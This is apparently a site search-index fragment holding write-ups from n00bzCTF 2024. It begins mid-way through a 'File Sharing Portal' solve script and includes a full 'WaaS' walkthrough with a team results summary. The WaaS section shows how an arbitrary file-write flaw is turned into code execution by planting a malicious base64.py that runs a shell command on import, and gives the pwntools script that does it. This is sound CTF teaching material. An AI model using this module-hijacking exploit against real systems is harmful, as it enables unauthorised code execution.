leak_subprocess_index() get_flag(subprocess_index) if __name__ == '__main__': main() $ flag: n00bz{n3v3r_7rus71ng_t4r_4g41n!_b3506983087e} Author: akiidjk ","permalink":"http://localhost:1313/writeups/noobzctf2024/filesharingportal/","title":"File Sharing Portal"},{"content":"Waas Description: Writing as a Service!\nIntroduction WaaS (Writing as a Service) allows us to overwrite a file on the system (after some input validation) and insert anything (until a newline is met) we want in it.\nimport subprocess from base64 import b64decode as d while True: print(\u0026quot;[1] Write to a file\\n[2] Get the flag\\n[3] Exit\u0026quot;) try: inp = int(input(\u0026quot;Choice: \u0026quot;).strip()) except: print(\u0026quot;Invalid input!\u0026quot;) exit(0) if inp == 1: file = input(\u0026quot;Enter file name: \u0026quot;).strip() assert file.count('.') \u0026lt;= 2 # Why do you need more? assert \u0026quot;/proc\u0026quot; not in file # Why do you need to write there? assert \u0026quot;/bin\u0026quot; not in file # Why do you need to write there? assert \u0026quot;\\n\u0026quot; not in file # Why do you need these? assert \u0026quot;chall\u0026quot; not in file # Don't be overwriting my files! try: f = open(file,'w') except: print(\u0026quot;Error! Maybe the file does not exist?\u0026quot;) f.write(input(\u0026quot;Data: \u0026quot;).strip()) f.close() print(\u0026quot;Data written sucessfully!\u0026quot;) if inp == 2: flag = subprocess.run([\u0026quot;cat\u0026quot;,\u0026quot;fake_flag.txt\u0026quot;],capture_output=True) # You actually thought I would give the flag? print(flag.stdout.strip()) Solution At first one may think of trying to bypass the input validation to perhaps rewrite the workings of the cat command or the challenge file itself, but this isn\u0026rsquo;t possible. Something very bizarre is the imported but unused b64decode from the base64 module, which is what allows us to solve the challenge. When python imports modules it looks in sys.path, which has a list of valid directories to import modules from. After a quick scan through the python3 docs we find out that the first directory it looks through is the same directory the file is in, this means that if we have a base64.py file in the directory then python will try to import a b64decode symbol from that file instead of the common known module. One more feature of python\u0026rsquo;s import behavior we can use is the that all the code in an imported module will be executed. For example if a file test.py has print('Hello, World!') and it can be executed (for example if it\u0026rsquo;s at the lowest indentation level) then a file with import test will indeed see Hello, World! printed to stdout. Therefore, since the open function with a 'w' flag will create a file if it does not exist, we can simply create a file named base64.py and write our malicious code in it. Something like this will do the trick:\nimport os; b64decode = 0; os.system(\u0026quot;cat flag.txt\u0026quot;) But the flag isn\u0026rsquo;t our yet; we need to use the fact that the instance does not reset its files every time we connect to it, which means that our base64.py will remain in the directory for the lifetime of the instance. This means we simply need to reconnect to it and get our flag.\nsolve.py\nfrom pwn import * def solve(): r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance r.sendlineafter(b'Choice: ', b'1') # 1 to write a file r.sendlineafter(b'Enter file name: ', b'base64.py') r.sendlineafter(b'Data: ', b'import os; b64decode = 0; os.system(\u0026quot;cat flag.txt\u0026quot;)') r.close() r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance flag = r.recvline().decode() print(f'flag: {flag}') r.close() if __name__ == '__main__': solve() flag: n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_f5c63f47af0e} Author: vympel\n","permalink":"http://localhost:1313/writeups/noobzctf2024/waas/","title":"WaaS"},{"content":" N00bz CTF 2024 Description A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz.\nUrl Discord Performance Summary CTFs: 31/32 Total points: 9794.000 Position: 24/967 Rating points: 24.067 Writeups Web File Sharing Portal Misc Waas ","permalink":"http://localhost:1313/writeups/n00bzctf2024/","title":"N00bzCTF 2024"}]